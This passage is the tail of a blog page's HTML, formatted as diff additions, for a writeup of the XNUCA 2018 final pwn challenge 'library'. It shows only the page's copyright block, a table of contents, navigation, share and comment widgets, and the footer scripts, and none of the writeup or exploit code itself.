+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/12/10/xnuca-library/">XNUCA 2018 final pwn第四题library writeup</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">850</a></p>
+        <p><span>发布时间:</span>2018-12-10, 20:42:34</p>
+        <p><span>最后更新:</span>2018-12-10, 21:21:31</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/12/10/xnuca-library/" title="XNUCA 2018 final pwn第四题library writeup">http://850.world/2018/12/10/xnuca-library/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://850.world/2018/12/10/xnuca-library/　　作者: 850" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/11/22/pwn-1/">
+                    pwn知识点巩固（二）
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">2.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用脚本"><span class="toc-number">3.</span> <span class="toc-text">利用脚本</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"XNUCA 2018 final pwn第四题library writeup　| 850's World　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'http://850.world/2018/12/10/xnuca-library/';
+            this.page.identifier = '2018/12/10/xnuca-library/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//850-world.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2018/11/22/pwn-1/" title="下一篇: pwn知识点巩固（二）">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/12/10/xnuca-library/">XNUCA 2018 final pwn第四题library writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/22/pwn-1/">pwn知识点巩固（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/20/pwn-0/">pwn知识点巩固（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/19/how-to-build-your-blog-with-Hexo/">从零开始的建博客生活</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018 850
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit" title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+<script type="text/javascript" src="/js/love.js"></script>
+
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-129429500-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
